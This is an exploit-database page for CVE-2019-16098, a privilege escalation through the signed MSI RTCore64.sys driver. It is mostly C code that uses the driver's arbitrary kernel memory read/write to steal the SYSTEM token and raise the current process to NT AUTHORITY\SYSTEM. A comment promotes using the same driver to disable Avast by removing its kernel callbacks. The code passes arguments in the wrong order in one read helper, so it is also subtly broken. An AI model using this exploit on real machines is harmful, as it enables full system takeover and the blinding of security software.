---
title: MSI RTCore64.sys Privilege escalation
url: https://cxsecurity.com/issue/WLB-2024100015
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2024-10-08
fetch_date: 2025-10-06T18:49:16.191605
---

# MSI RTCore64.sys Privilege escalation

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **MSI RTCore64.sys Privilege escalation** **2024.10.07**  Credit:  **[NSA](https://cxsecurity.com/author/NSA/1/)**  Risk: **Medium**  Local: ****Yes****  Remote: **No**  CVE: **[CVE-2019-16098](https://cxsecurity.com/cveshow/CVE-2019-16098/ "Click to see CVE-2019-16098")**  CWE: **[CWE-269](https://cxsecurity.com/cwe/CWE-269 "CWE-269")**  CVSS Base Score: **7.2/10**  Impact Subscore: **10/10**  Exploitability Subscore: **3.9/10**  Exploit range: **Local**  Attack complexity: **Low**  Authentication: **No required**  Confidentiality impact: **Complete**  Integrity impact: **Complete**  Availability impact: **Complete** | |

// RTCore64.sys allows arbitrary read/write, driver has a valid certificate.
// [ / ]: You can use this driver to make 'Avast' completely useless by removing the kernel callback.
/\* Before all, there is an important thing to note: there are some offsets, but these offsets may vary with different Windows winver versions: '0x448 = ActiveProcessLinks', '0x4B8 = Token', '0x440 = UniqueProcessId'
/\* --- RTCORE64.H --- \*/
typedef struct \_RTCORE64\_READ\_MEMORY
{
BYTE pad0[ 8 ];
DWORD64 address;
BYTE pad1[ 8 ];
DWORD readsize;
DWORD value;
BYTE pad2[ 16 ];
} RTCORE64\_READ\_MEMORY;
typedef struct \_RTCORE64\_WRITE\_MEMORY
{
BYTE pad0[ 8 ];
DWORD64 address;
BYTE pad1[ 8 ];
DWORD readsize;
DWORD value;
BYTE pad2[ 16 ];
} RTCORE64\_WRITE\_MEMORY;
DWORD ReadMemoryPrimitive( HANDLE hDevice, DWORD64 address, DWORD size )
{
RTCORE64\_READ\_MEMORY read\_memory = { 0 };
read\_memory.address = address;
read\_memory.readsize = size;
DWORD bytes = 0;
// 0x80002048 = RTCORE64\_READ\_MEMORY\_IOCTL
//
DeviceIoControl( hDevice, 0x80002048, &read\_memory,
sizeof( read\_memory ), &read\_memory, sizeof( read\_memory ), &bytes, NULL );
return read\_memory.value;
}
DWORD64 ReadMemoryDWORD64( HANDLE hDevice, DWORD64 address )
{
return ( DWORD64 ) ReadMemoryPrimitive( hDevice, 4, address + 4 ) << 32 | ReadMemoryPrimitive( hDevice, 4, address );
}
void WriteMemoryPrimitive( HANDLE hDevice, DWORD64 address, DWORD size, DWORD value )
{
RTCORE64\_WRITE\_MEMORY write\_memory = { 0 };
write\_memory.address = address;
write\_memory.readsize = size;
write\_memory.value = value;
DWORD bytes = 0;
// 0x8000204C = RTCORE64\_WRITE\_MEMORY\_IOCTL
//
DeviceIoControl( hDevice, 0x8000204C, &write\_memory,
sizeof( write\_memory ), &write\_memory, sizeof( write\_memory ), &bytes, NULL );
}
void WriteMemoryDWORD64( HANDLE hDevice, DWORD64 address, DWORD64 value )
{
WriteMemoryPrimitive( hDevice, 4, address, value & 0xFFFFFFFF );
WriteMemoryPrimitive( hDevice, 4, address + 4, value >> 32 );
}
/\* --- MAIN.C --- \*/
void NT\_AUTHORITY\_SYSTEM( void )
{
HANDLE hDevice = CreateFileA( "\\\\.\\RTCore64", GENERIC\_WRITE | GENERIC\_READ, 0, NULL, OPEN\_EXISTING, 0, NULL );
if ( hDevice == INVALID\_HANDLE\_VALUE || hDevice == NULL )
exit( 0 );
HMODULE ntoskrnl = LoadLibraryA( "ntoskrnl.exe" );
if ( ntoskrnl == NULL )
{
CloseHandle( hDevice );
exit( 0 );
}
DWORD64 PsInitialSystemProcessOffset = ( DWORD64 )
GetProcAddress( ntoskrnl, "PsInitialSystemProcess" ) - ( DWORD64 ) ntoskrnl;
DWORD64 PsInitialSystemProcessAddress = ReadMemoryDWORD64(
hDevice, GetNtoskrnlBaseAddress() + PsInitialSystemProcessOffset );
DWORD currentProcesID = GetCurrentProcessId();
DWORD64 currentProcessAddress = PsInitialSystemProcessAddress + 0x448;
DWORD64 systemProcessToken = ReadMemoryDWORD64(
hDevice, PsInitialSystemProcessAddress + 0x4B8 ) & ~15;
do
{
DWORD64 processAddress = currentProcessAddress - 0x448;
DWORD64 UniqueProcessId = ReadMemoryDWORD64( hDevice, processAddress + 0x440 );
if ( UniqueProcessId == ( DWORD64 ) ( currentProcesID ) ) break;
currentProcessAddress = ReadMemoryDWORD64( hDevice, processAddress + 0x448 );
} while ( currentProcessAddress != PsInitialSystemProcessAddress + 0x448 );
currentProcessAddress -= 0x448;
DWORD64 CurrentProcessTokenReferenceCounter =
ReadMemoryDWORD64( hDevice, currentProcessAddress + 0x4B8 ) & 15;
WriteMemoryDWORD64( hDevice, currentProcessAddress + 0x4B8, CurrentProcessTokenReferenceCounter | systemProcessToken );
CloseHandle( hDevice );
FreeLibrary( ntoskrnl );
}

**##### References:**

Privilege escalation:

https://github.com/Offensive-Panda/NT-AUTHORITY-SYSTEM-CONTEXT-RTCORE

[ / ]: Avast kernel callback remove:

https://medium.com/@VL1729\_JustAT3ch/removing-process-creation-kernel-callbacks-c5636f5c849f

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2024100015)

[Tweet](https://twitter.com/share)

Vote for this issue:
 0
 0

50%

50%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top